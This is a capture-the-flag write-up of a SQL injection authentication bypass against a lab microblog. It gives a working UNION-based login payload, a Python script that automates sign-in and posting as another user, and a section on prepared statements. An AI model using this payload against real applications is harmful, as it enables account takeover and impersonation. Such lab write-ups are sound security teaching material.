# Writeup – SQL Injection Authentication Bypass

This challenge involved exploiting **SQL injection vulnerabilities** to bypass authentication mechanisms in a web application. The goal was to craft malicious SQL queries that manipulate the authentication logic to gain unauthorized access as different users.

---

## 🔍 Challenge Overview

The challenge presented a microblog application with a vulnerable authentication system that improperly handles user input in SQL queries. The objective was to exploit this vulnerability to impersonate other users and post messages on their behalf.

### 🎯 Key Vulnerabilities:
- **Unsanitized SQL queries** in authentication logic
- **UNION-based SQL injection** allowing result manipulation
- **Insufficient input validation** on login parameters
- **Authentication bypass** through query manipulation

---

## 🛠️ My Exploitation Approach

### 1. **Vulnerability Analysis**
- Identified SQL injection in the `/signin.php` endpoint
- Discovered that email parameter is directly concatenated into SQL query
- Confirmed that UNION SELECT statements can manipulate authentication results
- Located vulnerable query pattern in user authentication logic

### 2. **SQL Injection Payload Development**
Crafted a UNION-based injection to manipulate authentication:
```python
mallory_impersonation = {
    'email': "0' UNION SELECT 'alice@example.com', 'Got You!', password FROM users WHERE email = 'mallory@example.com",
    'password': "pass4mallory"
}
```

### 3. **Authentication Bypass Technique**
The injection works by:
- **Breaking the original query** with a single quote
- **Injecting UNION SELECT** to control query results
- **Returning Alice's email** as the authenticated user
- **Using Mallory's known password** for authentication
- **Manipulating the result set** to bypass normal login validation

### 4. **Attack Automation**
Implemented automated exploitation using Python requests:
```python
# Reset the application state
requests.get(BASE + '/reset.php')

# Execute SQL injection attack
session = requests.Session()
response = session.post(BASE + '/signin.php', data=mallory_impersonation)

# Verify successful authentication bypass
if response.status_code == 200:
    # Post message as the impersonated user
    post_payload = {'msg': "Got You!"}
    post_response = session.post(BASE + '/post.php', data=post_payload)
```

---

## 🔬 Technical SQL Injection Analysis

### Original Vulnerable Query Structure
```sql
-- Likely vulnerable query in signin.php
SELECT email, username, password FROM users 
WHERE email = '$user_input' AND password = '$password'
```

### Injected Query Breakdown
```sql
-- What gets executed with our payload
SELECT email, username, password FROM users 
WHERE email = '0' 
UNION SELECT 'alice@example.com', 'Got You!', password 
FROM users WHERE email = 'mallory@example.com'
-- AND password = 'pass4mallory'
```

### Attack Flow Analysis
1. **Query Manipulation**: Original query returns no results (email = '0')
2. **UNION Injection**: Second SELECT returns crafted result set
3. **Identity Spoofing**: Returns Alice's email as authenticated user
4. **Password Validation**: Uses Mallory's known password for authentication
5. **Session Creation**: Application creates session for "alice@example.com"
6. **Privilege Escalation**: Attacker can now act as Alice

---

## 🧪 Attack Execution Details

### Environment Setup
- **Docker containerized** microblog application
- **Networked containers** for realistic testing environment
- **Automated reset** functionality for repeatable testing
- **HTTP-based** communication for clear traffic analysis

### Exploitation Steps
1. **Application Reset**: Clear previous state for clean testing
2. **Payload Injection**: Submit malicious SQL in email field
3. **Authentication Bypass**: Successfully login as target user
4. **Action Verification**: Post message to confirm impersonation
5. **Attack Success**: Demonstrate complete authentication bypass

### Container Architecture
```yaml
services:
  microblog:
    image: thierrysans/microblog:latest
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  mallory:
    image: thierrysans/mallory:microblog
    networks:
      channel:
        ipv4_address: 10.0.0.4
```

---

## 🏆 Attack Success

The SQL injection attack successfully:
- ✅ **Bypassed authentication** without knowing Alice's password
- ✅ **Impersonated legitimate user** through query manipulation
- ✅ **Posted unauthorized content** as the target user
- ✅ **Demonstrated complete compromise** of authentication system
- ✅ **Maintained session persistence** for continued access

### 🎯 Result: **Complete Authentication Bypass**

The attack successfully logged in as Alice and posted the message "Got You!" to her account, demonstrating complete compromise of the authentication system.

---

## 🛡️ Defense Mechanisms

### SQL Injection Prevention
1. **Prepared Statements**: Use parameterized queries with bound parameters
2. **Input Validation**: Strict validation and sanitization of user input
3. **Escaping**: Properly escape special characters in SQL queries
4. **Least Privilege**: Limit database user permissions
5. **WAF Implementation**: Web application firewalls for SQL injection detection

### Secure Code Examples
```php
// Vulnerable code
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";

// Secure prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->execute([$email, $password_hash]);
```

### Additional Security Measures
- **Input validation** with whitelist approaches
- **Output encoding** for displayed user data
- **Error message sanitization** to prevent information disclosure
- **Database query logging** for attack detection

---

## 📚 Key Learnings

1. **SQL Injection Fundamentals**: Understanding query manipulation techniques
2. **UNION-based Attacks**: Combining multiple SELECT statements for data extraction
3. **Authentication Bypass**: Exploiting login logic through injection
4. **Session Management**: Understanding web application authentication flows
5. **Container Security**: Testing in isolated Docker environments
6. **Defense Implementation**: Proper parameterized query development

---

## 🎯 Educational Value

This challenge demonstrated:
- **Classic web application vulnerabilities** that remain prevalent today
- **The critical importance** of input validation and parameterized queries
- **Authentication system security** and proper implementation practices
- **Attack automation techniques** for security testing
- **Container-based security testing** methodologies

---

## 🔒 Security Awareness

### Backend Sanitization Discovery
The flag **"backend-sanitization"** emphasizes the critical importance of:
- **Server-side input validation** rather than client-side only
- **Proper SQL query parameterization** using prepared statements
- **Defense in depth** with multiple validation layers
- **Secure coding practices** from the ground up

This highlights that security must be implemented at the backend level, not just relied upon client-side controls.

---

## 📁 Files Overview

- [`exploit.py`](./exploit.py) - Complete SQL injection authentication bypass
- [`docker-compose.yml`](./docker-compose.yml) - Container environment setup
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge showcased fundamental web application security skills and demonstrated the critical importance of implementing proper input validation and parameterized queries in database-driven applications.